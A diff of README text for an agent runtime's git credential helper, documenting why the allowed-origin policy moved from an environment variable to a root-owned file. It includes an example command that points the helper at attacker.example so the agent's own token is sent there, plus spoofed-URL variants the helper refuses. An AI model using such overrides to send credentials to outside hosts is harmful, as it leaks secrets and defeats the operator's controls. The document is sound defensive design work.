@@ -70,10 +70,34 @@ git makes inside the workspace — including the ones the agent itself triggers.
   names a readable file, otherwise from **`GITHUB_TOKEN`**. The file exists so the agent runtime can
   keep the PAT out of the environment it hands to the shell tool's children while git, running with
   that same scrubbed environment, can still authenticate.
-- Credentials are released **only** for the host in `AH_GIT_ALLOWED_HOST` (default `github.com`),
-  only over `https`, and only on the default port. The host is compared for exact equality against
-  the authority of the URL git names, so `github.com.evil.test`, `https://github.com@evil.test` and
-  `https://evil.test/github.com/x` are all refused.
+- Credentials are released **only** for the origin in `/opt/agent-runtime/allowed-origin`, which
+  the runner writes — root-owned, before the container starts — from the repository URL the
+  workspace was created for, after measuring it against `ALLOWED_REPO_HOSTS`. The prompt is reduced
+  to an origin — scheme, host and port, userinfo dropped — and compared for exact equality, so
+  `github.com.evil.test`, `https://github.com@evil.test`, `https://evil.test/github.com/x` and the
+  same host on another port are all refused, while a forge the operator listed on another host or
+  port is served.
+- **A file, not an environment variable, and the path is hard-coded.** The shell tool runs
+  `bash -lc` with a command the model wrote, and a command may set any variable for the process it
+  starts — so for as long as this policy lived in the environment,
+  `AH_GIT_ALLOWED_ORIGIN=https://attacker.example git clone …` let the model choose where its own
+  PAT was sent. `/opt/agent-runtime` is root-owned, so `agent` can read what is in it and can
+  neither rewrite nor unlink it; unlink is governed by the directory's write bit, not by the file's
+  owner. The container is not given the allow-list either: this helper decides from a host it reads
+  out of a prompt, so a set of acceptable origins would mean a crafted prompt naming any one of
+  them is answered with the token.
+- The binding is **origin-level** — scheme, host and port. Another repository on the same origin is
+  the same origin and is answered; the prompt does not carry a path to judge unless git is
+  configured to include one.
+- The approved origin must itself be `https`. `ALLOWED_REPO_HOSTS` may authorise a cleartext origin
+  — the local forge a container reaches through the host gateway is why it may — but that
+  authorises a clone, not a credential: a workspace created for an `http` origin clones anonymously
+  and is answered nothing here.
+- A missing, unreadable or empty `/opt/agent-runtime/allowed-origin` releases nothing. A container
+  nobody prepared has no forge to fall back to.
+- What this bounds is where the credential helper will send the PAT. It is **not** an egress
+  control: the token file is readable by `agent` by design (see R1 in the root `README.md`), and
+  the container has ordinary network access.
 - Every refusal prints nothing on stdout and exits non-zero, so git fails authentication instead of
   reading an empty line as a valid password. An absent or empty token fails the same way.
 
